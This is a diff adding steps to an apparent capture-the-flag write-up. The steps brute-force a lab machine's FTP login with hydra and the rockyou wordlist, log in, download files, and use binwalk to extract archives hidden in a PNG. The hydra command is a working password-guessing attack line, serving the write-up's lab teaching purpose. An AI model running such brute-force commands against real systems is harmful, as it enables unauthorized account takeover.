@@ -26,8 +26,20 @@ Changing the value of the User-Agent to **C** gave us some useful information:
 ***
 
 Now we are known as `chris`, We have successfully enumerated our target and can now bruteforce **FTP** on port 21 using **hydra**:
+
 Syntax: `sudo hydra -t 4 -l chris -P /usr/share/wordlists/rockyou.txt  -vV 10.10.115.114 ftp`
 ![image](https://github.com/sec-fortress/sec-fortress.github.io/assets/132317714/58627b49-1387-4f86-b125-acb1c87384a3)
+
+Login To FTP with `ftp chris@10.10.115.114` and **mget** the files:
+![image](https://github.com/sec-fortress/sec-fortress.github.io/assets/132317714/6bfecaa2-91f8-4fe2-ae88-f4e894fbdbc6)
+
+We can run `binwalk` in other to see all files embeded in each other:
+![image](https://github.com/sec-fortress/sec-fortress.github.io/assets/132317714/dd834bb0-9e32-4d0c-a8ff-179b45d857e2)
+
+We can see here that **cutie.png** has some zip archives, extract the archives with `binwalk -e cutie.png`
+
+
+
 
 
 
